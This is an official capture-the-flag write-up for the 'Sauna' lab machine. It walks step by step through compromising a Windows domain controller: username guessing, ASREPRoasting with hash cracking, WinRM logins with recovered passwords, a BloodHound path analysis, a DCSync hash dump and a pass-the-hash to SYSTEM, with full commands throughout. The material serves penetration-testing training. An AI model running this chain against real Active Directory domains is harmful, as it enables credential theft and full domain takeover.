@@ -1,0 +1,178 @@
+Sauna
+
+29th April 2020 / Document No D20.100.65
+Prepared By: bertolis
+Machine Author: egotisticalSW
+Difficulty: Easy
+Classification: Official
+Synopsis
+
+Sauna is an easy difficulty Windows machine that features Active Directory enumeration and
+exploitation. Possible usernames can be derived from employee full names listed on the website.
+With these usernames, an ASREPRoasting attack can be performed, which results in hash for an
+account that doesn't require Kerberos pre-authentication. This hash can be subjected to an
+offline brute force attack, in order to recover the plaintext password for a user that is able to
+WinRM to the box. Running WinPEAS reveals that another system user has been configured to
+automatically login and it identifies their password. This second user also has Windows remote
+management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-
+All extended right, which allows them to dump password hashes from the Domain Controller in a
+DCSync attack. Executing this attack returns the hash of the primary domain administrator, which
+can be used with Impacket's psexec.py in order to gain a shell on the box as
+NT_AUTHORITY\SYSTEM .
+
+Skills required
+
+      Basic knowledge of Windows
+      Basic knowledge of Active Directory
+
+Skills learned
+
+      ASREPRoasting Attack
+      DCSync Attack
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.175 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.175
+
+Nmap output reveals that this is a domain controller for the domain egotistical-bank.local .
+Internet Information Services (IIS) and LDAP are running on their respective default ports (80 and
+389), and can be enumerated further.
+
+LDAP
+
+Enumerating LDAP with windapsearch, we observe that anonymous binds are allowed. However,
+this doesn't return any domain objects.
+   ./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U
+
+We can try using Impacket's GetADUsers.py as well, but this doesn't return any useful
+information either.
+
+   GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug
+
+SMB
+
+The smbclient utility can be used to enumerate shares. Anonymous login is successful, but no
+shares are returned.
+Let's proceed to examine the website.
+
+Web
+
+Navigating to the website in a browser reveals a website for a bank. The Wappalyzer add-on
+doesn't identify any vulnerable technologies.
+
+Scanning the website using ffuf reveals some common files and directories, but nothing stands
+out as interesting.
+
+   ./ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/FUZZ
+
+On navigating to about.html and scrolling down, we see a section containing full names of some
+Bank employees.
+Foothold
+
+We can use a tool such as Username Anarchy to create common username permutations based
+on the full names. After saving the full names to a text file, we run the script.
+
+   ./username-anarchy --input-file fullnames.txt --select-format
+   first,flast,first.last,firstl > unames.txt
+
+With our list of common usernames, we can see if Kerberos pre-authentication has been disabled
+for any of them. Kerberos pre-authentication is a security feature that provides protection against
+password-guessing attacks. In some cases, applications require this setting to be enabled for
+their service account (e.g. Alfresco). When pre-authentication is not enforced, one could directly
+send a dummy request for authentication. The Key Distribution Center (KDC) of the Domain
+Controller will check the authentication service request (AS-REQ), verify the user information and
+return an encrypted Ticket Granting Ticket (TGT). The TGT contains material (the timestamp) that
+is encrypted with the NTLM hash of the corresponding account. A hash can be derived from this,
+that can be subjected to an offline brute force attack in order to reveal the plaintext password.
+Using Impacket's GetNPUser, we can attempt an ASREPRoasting attack in order to extract a hash
+from user accounts that do not require pre-authentication. A simple bash command can be used
+to execute this attack, and iterate through the usernames in unames.txt .
+
+   while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -
+   dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
+GetNPUsers.py returns a hash for user fsmith .
+
+Hashcat
+
+hashcat can be used to brute force the password. We can save the hash into a file, and
+determine the correct hash mode for ASREPRoasting.
+
+   hashcat --help | grep Kerberos
+
+We choose Kerberos 5 AS-REP etype 23 , i,e. mode 18200 . Next, run hashcat specifying this
+mode and the rockyou.txt wordlist.
+
+   hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
+After some seconds the password is found.
+
+WinRM
+
+With the gained credentials fsmith / Thestrokes23 we can try to login using WinRM (port
+5985). Windows Remote Management (WinRM), is a Windows-native built-in remote management
+protocol and it is often enabled for users that need to manage systems remotely. We can use evil-
+winrm to connect to the remote system.
+
+   evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
+The user flag is located in C:\Users\Fsmith\Desktop\ .
+Privilege Escalation
+
+Having gained a foothold on the machine, we can use a script such as WinPEAS to automate
+enumeration tasks. Use the upload command from our current WinRM session to transfer the
+binary to the remote server, and then run it.
+
+The script reveals that the user EGOTISTICALBANK\svc_loanmanager has been set to
+automatically log in, and this account has the password Moneymakestheworldgoround! .
+Examination of C:\Users\ confirms that the similarly named svc_loanmgr has logged on
+locally.
+
+The command net user svc_loanmgr reveals that this user is also part of the Remote
+Management Users group. Use evil-winrm again to login as this new user.
+
+   evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+Bloodhound
+
+We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify
+possible attack chains that will allow us to elevate our domain privileges. The bloodhound-
+python ingestor can be used to remotely collect data from the Active Directory. Then, we can run
+bloodhound to visualise any available attack paths.
+
+   sudo apt install bloodhound
+   sudo pip install bloodhound-python
+   bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-
+   BANK.LOCAL -ns 10.10.10.175 -c All
+
+Start neo4j server.
+   neo4j console
+
+Then type bloodhound to access the BloodHound UI. When bloodhound-python is finished,
+compress the files into a zip and upload it.
+
+   zip info.zip *.json
+BloodHound data consists of Nodes that represent principals and other objects in Active
+Directory, and Edges, which are links representing some form of object-to-object control or
+privileges. On the Queries tab, click on Find Principals with DCSync Rights . We note that
+node SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL is connected with the EGOTISTICAL-BANK.LOCAL
+node, via the GetChangesAll edge.
+
+After right-clicking on the edge and clicking Help , we see that svc_loanmgr is capable of
+dumping password hashes from the Domain Controller by using a DCSync attack.
+DCSync
+
+Impacket's secretsdump.py can be used to perform this attack.
+This script will reveal the NTLM hashes for all domain users, using the replication privileges. Run
+the command below to dump the password hash of the primary domain administrator.
+
+   secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user
+   Administrator
+
+Having successfully extracted the hash of the administrator, we can perform a Pass The Hass
+attack using Impacket's psexec.py and the returned hash, and get a shell as SYSTEM.
+
+   psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes
+   d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff
+
+The root flag is located in C:\Users\Administrator\Desktop\ .
+
